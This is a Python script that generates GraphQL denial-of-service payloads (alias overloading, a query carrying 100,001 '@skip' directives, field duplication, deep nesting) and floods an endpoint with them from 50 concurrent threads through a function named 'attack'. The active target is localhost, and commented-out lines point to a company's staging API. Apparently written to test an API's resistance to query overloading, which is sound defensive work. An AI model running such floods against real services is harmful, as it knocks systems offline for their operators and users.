import time
import requests
from concurrent.futures import ThreadPoolExecutor

# GRAPHQL_ENDPOINT = "https://foxden-stage.api.foxquilt.com/ratingquoting/2022-06-30/graphql"
# REFERER = "https://join-stage.foxquilt.com/"
# ORIGIN = "https://join-stage.foxquilt.com"

GRAPHQL_ENDPOINT = "http://localhost:4002/local/2022-06-30/graphql"
REFERER = "http://localhost:4002/"
ORIGIN = "http://localhost:4002"

def generate_alias_overloading_query(n_aliases=100):
  aliases = "\n".join([
    f"alias{i}: __typename"
    for i in range(n_aliases)
  ])

  query = f"""query {{
{aliases}
}}"""
  return query

def generate_directive_overloading_query(m_directives=50):
    directives = " ".join([f"@skip(if: false)" for _ in range(m_directives)])
    query = f"""query {{
 __typename {directives}
}}"""
    return query

def generate_field_duplication_query(n_fields=100):
    fields = "\n".join(["__typename" for _ in range(n_fields)])
    query = f"""query {{
{fields}
}}"""
    return query

def generate_deep_query(depth=10):
    query = "query {\n"
    for i in range(depth):
        query += "  " * i + f"level{i} {{\n"
    query += "  " * depth + "__typename\n"
    for i in range(depth):
        query += "  " * (depth - i - 1) + "}\n"
    query += "}"
    return query

def send_graphql_request(query):
  headers = {
    "Content-Type": "application/json",
    "Referer": REFERER,
    "Origin": ORIGIN
  }
  payload = {
    "query": query,
  }
  start_time = time.time() # Start measuring time
  response = requests.post(GRAPHQL_ENDPOINT, json=payload, headers=headers)
  elapsed_time = time.time() - start_time # End measuring time
  return response, elapsed_time

def attack(query):
   t = 0
   while t < 100:
     t += 1
     try:
       resp, elapsed = send_graphql_request(query)
       print(f"Status Code: {resp.status_code}, Time Taken: {elapsed:.4f} seconds")
     except Exception as e:
       print(f"Error occurred: {e}")

def main():
  print("[*] Sending Directive Overloading Query...")
  directive_query = generate_directive_overloading_query(m_directives=100001)
  with ThreadPoolExecutor(max_workers=50) as executor:
    for _ in range(50): # 50 x 500
      executor.submit(attack, directive_query)


if __name__ == "__main__":
  main()


